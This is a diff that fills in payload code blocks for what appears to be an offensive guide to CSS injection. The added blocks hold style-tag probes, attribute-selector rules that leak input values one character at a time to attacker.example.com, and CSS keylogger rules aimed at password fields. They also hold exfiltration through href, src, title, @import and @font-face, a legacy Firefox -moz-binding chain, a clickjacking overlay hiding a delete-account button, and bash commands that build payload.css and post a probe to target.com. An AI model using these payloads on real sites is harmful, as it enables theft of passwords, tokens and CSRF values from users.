@@ -37,6 +37,19 @@ CSS injection is most powerful when the attacker is authenticated and the target
 
 CSS injection occurs when user-controlled input is inserted into a `<style>` block, a `style` attribute, or an external stylesheet reference without proper sanitization. The fundamental primitive is:
 
+```css
+background: url(https://attacker.example.com/callback?stolen=data);
+```
+
+**Payload:** style-tag / style-attribute injection probe:
+
+```html
+<style>
+  body { background: url(https://attacker.example.com/css-probe?hit=1); }
+</style>
+
+<div style="background:url(https://attacker.example.com/css-probe?attr=1)">
+```
 
 Common injection points:
 
@@ -58,6 +71,14 @@ CSS attribute selectors match HTML attribute values and can trigger resource loa
 
 ### Syntax
 
+**Payload:** attribute-selector exfiltration — each rule triggers a callback only when the attribute value starts with the given character:
+
+```css
+input[value^="a"] { background: url(//attacker.example.com/exfil?char=a); }
+input[value^="b"] { background: url(//attacker.example.com/exfil?char=b); }
+input[value^="c"] { background: url(//attacker.example.com/exfil?char=c); }
+/* ... one rule per candidate character ... */
+```
 
 ### Attribute Selectors
 
@@ -77,10 +98,22 @@ Extracting a full value requires iterating over each position. For a token of le
 
 ### Generation Template
 
+```css
+/* Position 0: which character does the value start with? */
+input[value^="0"] { background-image: url(//attacker.example.com/exfil?p=0&c=0); }
+input[value^="1"] { background-image: url(//attacker.example.com/exfil?p=0&c=1); }
+/* ... a-z, 0-9 ... */
 
 ### Known Prefix Building
 
 Once position 0 is confirmed (callback received for that character), the prefix grows:
+
+/* Prefix "a8f" confirmed — probe position 3 */
+input[value^="a8f0"] { background-image: url(//attacker.example.com/exfil?p=3&c=0); }
+input[value^="a8f1"] { background-image: url(//attacker.example.com/exfil?p=3&c=1); }
+```
+
+Each callback's `c` parameter appends one character to the known prefix; repeat until no rule fires (end of value).
 
 
 ### Optimization
@@ -98,6 +131,14 @@ A CSS keylogger captures keystrokes by styling input elements based on `:focus` 
 
 ### Focus-Based Keylogger
 
+```css
+input[type="password"] {
+  background-image: url(//attacker.example.com/log?field=password);
+}
+input:focus {
+  background-image: url(//attacker.example.com/log?event=focus);
+}
+```
 
 ### Attribute-Based Keystroke Inference
 
@@ -108,6 +149,12 @@ When input fields have dynamic attributes that change with each keystroke (e.g.,
 
 If the password field reflects typed characters in a `value` attribute (e.g., auto-fill, some JS frameworks):
 
+```css
+input[type="password"][value$="a"] { background-image: url(//attacker.example.com/keys?last=a); }
+input[type="password"][value$="b"] { background-image: url(//attacker.example.com/keys?last=b); }
+input[type="password"][value^="a"] { background-image: url(//attacker.example.com/keys?first=a); }
+input[type="password"][value^="b"] { background-image: url(//attacker.example.com/keys?first=b); }
+```
 
 ### Practical Limitations
 
@@ -123,17 +170,44 @@ When no direct rendering is visible, CSS injection can still exfiltrate data fro
 
 ### Exfiltrating from `href` Attributes
 
+```css
+a[href^="https://target.com/token="] { background: url(//attacker.example.com/exfil?href-prefix-hit); }
+a[href*="csrf"] { background: url(//attacker.example.com/exfil?href-contains=csrf); }
+```
 
 ### Exfiltrating from `src` Attributes
 
+```css
+img[src^="/avatars/admin"] { background: url(//attacker.example.com/exfil?src=admin-avatar); }
+img[src*="session"] { background: url(//attacker.example.com/exfil?src=session); }
+```
 
 ### Exfiltrating from `title` and `alt` Attributes
 
+```css
+[title^="Bearer "] { background: url(//attacker.example.com/exfil?title=bearer); }
+img[alt*="@gmail.com"] { background: url(//attacker.example.com/exfil?alt=email); }
+```
 
 ### Exfiltrating via `@import`
 
+**Payload:** injected style pulls a second attacker-hosted stylesheet containing the full rule set:
+
+```css
+@import url(//attacker.example.com/payload.css);
+```
+
+`payload.css` holds the per-character rules, so the injection stays a one-liner and rules can be rotated without re-injecting.
 
 ### Exfiltrating via `@font-face`
+
+```css
+@font-face {
+  font-family: exfil;
+  src: url(//attacker.example.com/font?leak=hit) format('woff');
+}
+input[value^="secret"] { font-family: exfil; }
+```
 
 
 This is often more reliable than `background-image` because font loading is less likely to be blocked or cached.
@@ -175,9 +249,21 @@ CSS can trigger DOM mutations that enable XSS when combined with certain HTML pa
 
 ### Technique
 
+**Payload:** `@import` + `-moz-binding` mutation chain (legacy Firefox):
+
+```html
+<style>
+  @import url(https://attacker.example.com/mutation.css);
+</style>
+```
 
 If the imported stylesheet contains:
 
+```css
+body {
+  -moz-binding: url(https://attacker.example.com/bind.xml#exec);
+}
+```
 
 In older Firefox versions, this could trigger XBL (XML Binding Language) execution.
 
@@ -191,6 +277,22 @@ In older Firefox versions, this could trigger XBL (XML Binding Language) executi
 
 ### UI Redressing (Clickjacking via CSS)
 
+**Payload:** `position: fixed` overlay hiding a real button behind a decoy:
+
+```html
+<style>
+  .overlay {
+    position: fixed;
+    top: 100px; left: 50px;
+    z-index: 9999;
+    background: #fff;
+    padding: 20px;
+  }
+  /* hide the real security-critical element */
+  #delete-account-btn { display: none; }
+</style>
+<div class="overlay">Click here to claim your prize</div>
+```
 
 Overlay an invisible iframe on top of a legitimate page element to trick users into clicking.
 
@@ -218,6 +320,19 @@ Overlay an invisible iframe on top of a legitimate page element to trick users i
 
 ### Tool Commands
 
+```bash
+# Serve exfil rules + capture callbacks (simple listener)
+python3 -m http.server 8080
+
+# Generate per-character attribute-selector rules for a target prefix
+for c in {a..z} {0..9}; do
+  echo "input[value^=\"$c\"]{background:url(//attacker.example.com/exfil?c=$c);}"
+done > payload.css
+
+# Confirm the injection point renders: probe callback must appear in listener log
+curl -X POST https://target.com/profile/theme \
+  -d 'css=body{background:url(//attacker.example.com/css-probe?hit=1)}'
+```
 
 ### Checklist
 
